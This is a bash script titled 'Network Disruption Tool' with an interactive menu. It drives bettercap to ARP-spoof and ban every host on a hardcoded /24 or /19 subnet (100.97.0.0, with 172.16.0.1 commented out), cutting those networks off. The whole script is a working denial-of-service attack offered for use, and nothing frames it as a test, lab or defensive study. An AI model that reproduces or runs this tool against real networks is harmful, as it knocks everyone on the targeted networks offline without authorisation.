#!/bin/bash

# Function to check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo "❌ Please run as root (use sudo)"
        exit 1
    fi
}

# Function to check if bettercap is installed
check_bettercap() {
    if ! command -v bettercap >/dev/null 2>&1; then
        echo "❌ Bettercap not found! Please install it first:"
        echo "1. Install Homebrew if not installed:"
        echo "   /bin/bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\""
        echo ""
        echo "2. Install Bettercap:"
        echo "   brew install bettercap"
        exit 1
    fi
}

# Function to stop bettercap and cleanup
cleanup() {
    echo "Cleaning up..."
    pkill -f bettercap >/dev/null 2>&1
    echo "Operations stopped."
    exit 0
}

# Initialize variables
CURRENT_TARGET=""
CURRENT_NETWORK_SIZE=""

# Function to start network disruption
start_disruption() {
    local network_size=$1
    CURRENT_TARGET="100.97.0.0"
    # CURRENT_TARGET="172.16.0.1"
    CURRENT_NETWORK_SIZE="$network_size"
    echo "Starting network disruption for /$network_size network..."
    sudo bettercap -iface en0 -eval "
    set arp.spoof.targets $CURRENT_TARGET/$network_size;
    set arp.ban.enabled true;
    arp.ban on;" &
    BETTERCAP_PID=$!
}

# Function to display interface
display_interface() {
    clear
    echo "====================================="
    echo "        NETWORK DISRUPTION TOOL      "
    echo "====================================="
    echo "Status: $(if pgrep bettercap >/dev/null; then echo "🟢 Running"; else echo "🔴 Stopped"; fi)"
    echo "Interface: en0"
    if [ -n "$CURRENT_TARGET" ] && [ -n "$CURRENT_NETWORK_SIZE" ]; then
        echo "Target: $CURRENT_TARGET/$CURRENT_NETWORK_SIZE"
    else
        echo "Target: Not set"
    fi
    echo "Last refresh: $(date +"%H:%M:%S")"
    echo "====================================="
    echo ""
    echo "1. Disrupt /24 Network"
    echo "2. Disrupt /19 Network"
    echo "3. Quit"
    echo ""
    echo "====================================="
}

# Check for root privileges
check_root

# Check for bettercap installation
check_bettercap

# Kill any existing bettercap processes
pkill -f bettercap >/dev/null 2>&1

# Reset target on startup
CURRENT_TARGET=""
CURRENT_NETWORK_SIZE=""

# Main loop
while true; do
    display_interface
    
    echo -n "Enter option: "
    read -n 1 key
    echo ""
    
    case "$key" in
        1)
            if ! pgrep bettercap >/dev/null; then
                start_disruption 24
                echo "Network disruption started for /24 network."
            else
                echo "Disruption is already running!"
            fi
            sleep 2
            ;;
        2)
            if ! pgrep bettercap >/dev/null; then
                start_disruption 19
                echo "Network disruption started for /19 network."
            else
                echo "Disruption is already running!"
            fi
            sleep 2
            ;;
        3)
            cleanup
            ;;
        *)
            echo "Invalid option"
            sleep 1
            ;;
    esac
done